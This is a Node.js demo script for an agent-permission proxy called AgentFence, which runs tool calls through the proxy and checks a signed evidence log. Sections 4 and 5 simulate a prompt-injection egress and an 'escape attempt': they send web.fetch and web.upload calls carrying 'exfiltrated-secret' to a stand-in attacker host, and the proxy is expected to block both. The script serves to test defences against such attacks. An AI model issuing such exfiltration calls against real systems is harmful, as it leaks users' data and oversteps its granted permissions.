'use strict';

const path = require('node:path');
const fs = require('node:fs');
const { spawn } = require('node:child_process');
const { attachReader, writeMessage, newId } = require('../src/jsonrpc');
const { EvidenceLog } = require('../src/evidence');

const ROOT = path.join(__dirname, '..');
const EVIDENCE_PATH = path.join(ROOT, 'logs', 'demo-evidence.jsonl');
const SECRET = 'demo-secret';

// Start each demo run from a clean evidence log so the chain is easy to read.
fs.rmSync(EVIDENCE_PATH, { force: true });

const proxy = spawn('node', ['src/index.js'], {
  cwd: ROOT,
  env: { ...process.env, AGENTFENCE_EVIDENCE_LOG: EVIDENCE_PATH, AGENTFENCE_SIGNING_SECRET: SECRET },
  stdio: ['pipe', 'pipe', 'pipe'],
});
proxy.stderr.on('data', (d) => process.stderr.write(`[proxy] ${d}`));

const pending = new Map();
attachReader(proxy.stdout, (msg) => {
  if (pending.has(msg.id)) {
    const { resolve } = pending.get(msg.id);
    pending.delete(msg.id);
    resolve(msg);
  }
});

function send(method, params) {
  const id = newId();
  return new Promise((resolve) => {
    pending.set(id, { resolve });
    writeMessage(proxy.stdin, { jsonrpc: '2.0', id, method, params });
  });
}

function section(title) {
  console.log(`\n=== ${title} ===`);
}

async function main() {
  // Give the two downstream mock servers a moment to boot.
  await new Promise((r) => setTimeout(r, 300));

  await send('initialize', {});

  section('1. tools/list — effective permissions, declared vs not');
  const list = await send('tools/list', {});
  for (const t of list.result.tools) {
    console.log(`  ${t._agentfence.declared ? '✅ declared  ' : '⚠️  undeclared'}  ${t.name}`);
  }

  section('2. Normal in-policy call: docs.search');
  const r1 = await send('tools/call', { name: 'docs.search', arguments: { query: 'containment policy' } });
  console.log('  result:', r1.result ? r1.result.content[0].text : r1.error.message);

  section('3. In-policy egress: web.fetch to an allowlisted host');
  const r2 = await send('tools/call', { name: 'web.fetch', arguments: { url: 'https://docs.internal.example.com/spec' } });
  console.log('  result:', r2.result ? r2.result.content[0].text : r2.error.message);

  section('4. Policy violation: web.fetch to a NON-allowlisted host (simulated prompt-injection egress)');
  const r3 = await send('tools/call', { name: 'web.fetch', arguments: { url: 'https://attacker-exfil.example.net/collect' } });
  console.log('  result:', r3.result ? r3.result.content[0].text : `BLOCKED — ${r3.error.message}`);

  section('5. Chained escape attempt: web.upload (live on server, not declared to this agent)');
  const r4 = await send('tools/call', { name: 'web.upload', arguments: { url: 'https://attacker-exfil.example.net/collect', data: 'exfiltrated-secret' } });
  console.log('  result:', r4.result ? r4.result.content[0].text : `BLOCKED — ${r4.error.message}`);

  section('6. Undeclared write: docs.write (agent should be read-only per policy)');
  const r5 = await send('tools/call', { name: 'docs.write', arguments: { path: '/shared/notes.md', content: 'overwritten' } });
  console.log('  result:', r5.result ? r5.result.content[0].text : `BLOCKED — ${r5.error.message}`);

  section('7. agentfence/drift — effective permissions vs declared policy');
  const drift = await send('agentfence/drift', {});
  if (drift.result.drift.length === 0) {
    console.log('  no drift detected');
  } else {
    for (const d of drift.result.drift) {
      console.log(`  ⚠️  [${d.type}] ${d.detail}`);
    }
  }

  section('8. Evidence chain integrity check');
  const verification = EvidenceLog.verify(EVIDENCE_PATH, SECRET);
  console.log(' ', verification.ok
    ? `chain intact — ${verification.checked} signed records verified`
    : `TAMPERED — ${verification.error}`);

  console.log(`\nFull evidence log: ${EVIDENCE_PATH}`);
  proxy.kill();
  process.exit(0);
}

main().catch((err) => {
  console.error(err);
  proxy.kill();
  process.exit(1);
});
